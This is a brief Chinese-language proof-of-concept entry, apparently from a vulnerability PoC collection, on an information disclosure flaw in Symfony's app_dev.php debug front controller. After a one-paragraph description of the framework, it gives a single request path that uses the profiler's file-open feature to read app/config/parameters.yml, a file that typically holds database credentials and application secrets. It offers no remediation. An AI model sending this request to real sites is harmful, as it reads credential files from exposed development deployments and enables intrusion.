## Symfony-app_dev.php信息泄露漏洞

Sensio Labs Symfony是法国Sensio Labs公司的一套免费的、基于MVC架构的PHP开发框架。该框架提供常用的功能组件及工具，可用于快速创建复杂的WEB程序。

## poc

```
/app_dev.php/_profiler/open?file=app/config/parameters.yml
```

![image-20240603090612812](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406030906924.png)